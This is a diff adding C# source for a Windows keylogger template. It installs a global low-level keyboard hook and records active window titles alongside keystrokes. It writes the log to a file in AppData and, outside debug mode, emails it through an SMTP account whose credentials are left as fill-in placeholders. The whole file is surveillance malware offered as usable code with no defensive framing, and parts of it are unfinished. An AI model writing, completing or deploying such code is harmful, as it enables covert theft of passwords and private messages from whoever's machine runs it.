@@ -1,0 +1,407 @@
+using System;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Threading;
+using System.Windows.Input;
+using System.Windows.Forms;
+using System.Text;
+using System.Timers;
+using System.Net.Mail;
+
+namespace Base
+{
+    class Template
+    {
+        #region Needed Components
+        ///////////////////////////////////////////////////////////
+        //A bunch of DLL Imports to set a low level keyboard hook
+        ///////////////////////////////////////////////////////////
+        // Declare the SetConsoleCtrlHandler function
+        // as external and receiving a delegate.
+
+        // An enumerated type for the control messages
+        // sent to the handler routine.
+        
+
+        #region DLL IMPORTS 
+        [DllImport("Kernel32")]
+        public static extern bool SetConsoleCtrlHandler(HandlerRoutine Handler, bool Add);
+
+        // A delegate type to be used as the handler routine
+        // for SetConsoleCtrlHandler.
+        public delegate bool HandlerRoutine(CtrlTypes CtrlType);
+
+        [DllImport("user32.dll")]
+        static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);
+
+        [DllImport("user32.dll")]
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+
+        [DllImport("user32.dll")]
+        static extern IntPtr SetWinEventHook(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook,
+            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
+        public static extern short GetKeyState(int keyCode);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+            IntPtr wParam, IntPtr lParam);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+        #endregion
+
+        ////////////////////////////////////////////////////////////////
+        //Some constants to make handling our hook code easier to read ( keyboard hook)
+        ////////////////////////////////////////////////////////////////
+        private const int WH_KEYBOARD_LL = 13;                    //Type of Hook - Low Level Keyboard
+        private const int WM_KEYDOWN = 0x0100;                    //Value passed on KeyDown
+        private const int WM_KEYUP = 0x0101;                      //Value passed on KeyUp
+        private static LowLevelKeyboardProc _proc = HookCallback; //The function called when a key is pressed
+        private static IntPtr _hookID = IntPtr.Zero;
+        delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);
+
+        public enum CtrlTypes
+        {
+            CTRL_C_EVENT = 0,
+            CTRL_BREAK_EVENT,
+            CTRL_CLOSE_EVENT,
+            CTRL_LOGOFF_EVENT = 5,
+            CTRL_SHUTDOWN_EVENT
+        }
+
+        // Active Window changed
+        static WinEventDelegate dele { get; set; }
+        static string _LastWindowTitle { get; set; }
+
+        // Active Window changed
+        private const uint WINEVENT_OUTOFCONTEXT = 0;
+        private const uint EVENT_SYSTEM_FOREGROUND = 3;
+
+        // appdata path constant
+        static string sessionID { get; set; }
+        static string aPath { get; set; }
+        public static StringBuilder logContainer { get; set; }
+        public static System.Timers.Timer aTimer { get; set; }
+		public static string lastPressedKey { get; set; }
+        public static bool debugMode = true;
+
+		// Email storage settings
+        static string m_username = "%USERNAME%";
+        static string m_password = "%PASSWORD%";
+        static string m_host = "%HOSTSMTP%";
+        static int m_hostPort = %SMTPPORT%;
+
+        public static string GetActiveProcessFileName()
+        {
+            try
+            {
+                string pName;
+                IntPtr hwnd = GetForegroundWindow();
+                uint pid;
+                GetWindowThreadProcessId(hwnd, out pid);
+                Process p = Process.GetProcessById((int)pid);
+                pName = p.MainModule.FileName.ToString();
+
+                return pName + ".exe";
+            }
+            catch (Exception)
+            {
+                // do nothing
+                return "ERNO 1";
+                // ERNO 1 is returned when neither GetActiveWindowtitle or GetActiveProcesFiilename could return any values
+            }
+        }
+        private static string GetActiveWindowTitle()
+        {
+            const int nChars = 256;
+            IntPtr handle = IntPtr.Zero;
+            StringBuilder Buff = new StringBuilder(nChars);
+            handle = GetForegroundWindow();
+
+            if (GetWindowText(handle, Buff, nChars) > 0)
+            {
+                    return Buff.ToString();
+            } else
+            {
+                return GetActiveProcessFileName();
+                //return "null";
+            }
+            
+        }
+        public static void Logger(string text, bool newline = false, int newLineCount = 0)
+        {
+            string n = "";
+            if (newline)
+            {
+                if (newLineCount == 0)
+                {
+                    logContainer.Append(Environment.NewLine + text);
+                } else if (newLineCount > 1)
+                {
+                    for (int i = 0; i <= newLineCount - 1; i++)
+                    {
+                        n = n + Environment.NewLine;
+                    }
+                    logContainer.Append(n + text);
+                }
+            } else
+            {
+                logContainer.Append(text);
+            }
+            
+        }
+        public static bool DumpToFile()
+        {
+            if (System.IO.File.Exists(@aPath))
+            {
+                using (System.IO.StreamWriter file =
+                new System.IO.StreamWriter(@aPath))
+                {
+                    file.WriteLine(logContainer.ToString());
+                }
+                return true;
+            } else
+            {
+                System.IO.File.CreateText(@aPath).Dispose();
+                System.IO.File.WriteAllText(@aPath, logContainer.ToString());
+                return true;
+            }
+        }
+
+		 public static void Transmit(string recipient,string username, string pass, string smtpHost, int port)
+        {
+            // Command line argument must the the SMTP host.
+            SmtpClient client = new SmtpClient();
+            client.Port = port;
+            client.Host = smtpHost;
+            client.EnableSsl = true;
+            client.Timeout = 10000;
+            client.DeliveryMethod = SmtpDeliveryMethod.Network;
+            client.UseDefaultCredentials = false;
+            client.Credentials = new System.Net.NetworkCredential(username, pass);
+
+            MailMessage mm = new MailMessage("donotreply@domain.com", recipient, String.Format("Logs from user {0} ({1})", "getcomputerusername", DateTime.Now.ToString()), logContainer.ToString());
+            mm.BodyEncoding = UTF8Encoding.UTF8;
+            mm.DeliveryNotificationOptions = DeliveryNotificationOptions.OnFailure;
+
+            client.Send(mm);
+        }
+
+        public static void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
+        {
+           Console.Write(String.Format("\n\n#=== ACTIVE WINDOW/PROCESS NAME: {0} ===#\n", GetActiveWindowTitle()));
+           Logger(String.Format(Environment.NewLine + "\n\n#=== ACTIVE WINDOW/PROCESS NAME: {0} ===#\n" + Environment.NewLine, GetActiveWindowTitle()), true);
+        }
+
+        public static void Main()
+        {
+		    sessionID = String.Format("{0}-{1}.txt", DateTime.Now.DayOfWeek.ToString(), DateTime.Now.TimeOfDay.ToString().Replace(":", "-"));
+			aPath = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), sessionID);
+			logContainer = new StringBuilder();
+			aTimer = new System.Timers.Timer();
+
+            _LastWindowTitle = GetActiveWindowTitle();
+            Console.Write(String.Format("\n\n#=== ACTIVE WINDOW/PROCESS NAME: {0} ===#\n", GetActiveWindowTitle()));
+            Logger(String.Format(Environment.NewLine + "\n\n#=== ACTIVE WINDOW/PROCESS NAME: {0} ===#\n" + Environment.NewLine, GetActiveWindowTitle(), true));
+
+            dele = new WinEventDelegate(WinEventProc);
+            IntPtr m_hhook =    SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, dele, 0, 0, WINEVENT_OUTOFCONTEXT);
+            _hookID = SetHook(_proc);  //Set our keyboard hook
+            SetConsoleCtrlHandler(new HandlerRoutine(ConsoleCtrlCheck), true); // Set up event to handle console closing events for unhooking keyboard properly
+
+            IntPtr handle = Process.GetCurrentProcess().MainWindowHandle;
+            //System.Timers.Timer aTimer = new System.Timers.Timer();
+            aTimer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
+
+            // INTERVAL
+            //aTimer.Interval = 60000;
+            aTimer.Interval = 10000;
+
+            aTimer.Enabled = true;
+            aTimer.Start();
+
+            Application.Run();         //Start a standard application method loop
+        }
+
+        private static void OnTimedEvent(object source, ElapsedEventArgs e)
+        {
+            if (debugMode == true)
+            {
+                // Dont forget to remove this after testing is done
+                aTimer.Stop();
+                // Dont forget to remove this after testing is done
+
+                Console.Write(String.Format("\n\nTimer completed one cycle of {0} ms and will perform a logdump to file", aTimer.Interval.ToString()));
+
+                    MessageBox.Show("Logs written successfully!");
+					Process.Start(aPath);
+                    // upload logs
+                    // either using the contents from file aPath
+                    // or simply directly use the content of logContainer.ToString();
+
+            } else
+            {
+					try 
+					{
+						Transmit(m_username, m_username, m_password, m_host, m_hostPort);
+					} catch (Exception)
+					{
+						//MessageBox.Show("Could not transmit logs");
+						// FAILED SENDING LOGS
+
+						return;
+					}
+            }
+        }
+
+
+        private static bool ConsoleCtrlCheck(CtrlTypes ctrlType) // Event for detecting program close/handle
+        {
+            IntPtr handle = Process.GetCurrentProcess().MainWindowHandle;
+            switch (ctrlType)
+            {
+                case CtrlTypes.CTRL_CLOSE_EVENT:
+                    UnhookWindowsHookEx(_hookID);
+
+                    break;
+
+                case CtrlTypes.CTRL_LOGOFF_EVENT:
+                case CtrlTypes.CTRL_SHUTDOWN_EVENT:
+                    UnhookWindowsHookEx(_hookID);
+
+                    break;
+            }
+            return true;
+        }
+
+        private static IntPtr SetHook(LowLevelKeyboardProc proc)
+        {
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule)
+            {
+                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+                    GetModuleHandle(curModule.ModuleName), 0);
+            }
+        }
+
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+        #endregion
+
+        #region Hook Callback function, processes all keys pressed
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) 
+        {
+            // if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) //A Key was pressed down
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP) //A Key was pressed down
+            {
+                int vkCode = Marshal.ReadInt32(lParam);           //Get the keycode
+                bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
+                string theKey = ((Keys)vkCode).ToString();
+
+                #region ugly character modifying
+                if ((Keys)vkCode >= Keys.A  && (Keys)vkCode <= Keys.Z)
+               {
+                    if (CapsLock)
+                    {
+                        theKey = ((Keys)vkCode).ToString().ToUpper();
+                    } else
+                    {
+                        theKey = ((Keys)vkCode).ToString().ToLower();
+                    }
+               } else
+               {
+                    switch (theKey)
+                    {
+                        case "Tab":
+                            theKey = "[TAB]";
+                            break;
+                        case "Capital":
+                            if (CapsLock == true)
+                            {
+                                theKey = "[CAPSLOCK: OFF]";
+                            } else
+                            {
+                                theKey = "[CAPSLOCK: ON]";
+                            }
+                            break;
+                        case "escape":
+                            theKey = "[ESCAPE]";
+                            break;
+                        case "Space":
+                            theKey = " ";
+                            break;
+                        case "LControlKey":
+                            theKey = "[LControlKey]";
+                            break;
+                        case "LWin":
+                            theKey = "[WindowsKey]";
+                            break;
+                        case "RControlKey":
+                            theKey = "[RControlKey]";
+                            break;
+                        case "RShiftKey":
+                            theKey = "[RShiftKey]";
+                            break;
+                        case "LShiftKey":
+                            theKey = "[LShiftKey]";
+                            break;
+                        case "Return":
+                            theKey = "\n[EnterKey] pressed, new line:";
+                            break;
+                        case "Back":
+                            theKey = "[BackKey]";
+                            break;
+                        case "Oemcomma":
+                            theKey = ",";
+                            break;
+                        case "OemPeriod":
+                            theKey = ".";
+                            break;
+                    }
+                }
+
+                // Check if key is from F1 to F24 and format them corectly
+                if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
+                {
+                    theKey = "[" + (Keys)vkCode + "]";
+                }
+                // Check if key is from F1 to F24 and format them corectly
+                if ((Keys)vkCode >= Keys.D0 && (Keys)vkCode <= Keys.D9)
+                {
+                    theKey = Convert.ToString((Keys)vkCode).Replace("D", String.Empty);
+                }
+                #endregion
+
+                lastPressedKey = theKey;
+
+                if(debugMode == true)
+                {
+                    // If debug mode is true, make console window visible and print out keys pressed in screen
+                    Console.Write(theKey);
+                    Logger(theKey, false);
+                } else
+                {
+                    // store all key presses in a session variable for sending to host computer
+
+                    // Remove this line when done
+                    // stringbuilder.append(thekey) etc etc
+
+                    Console.Write("DebugMode is set to false... (not writing to log file)");
+                }
+            }
+            return CallNextHookEx(_hookID, nCode, wParam, lParam); //Call the next hook
+        }
+        #endregion
+    }
+}
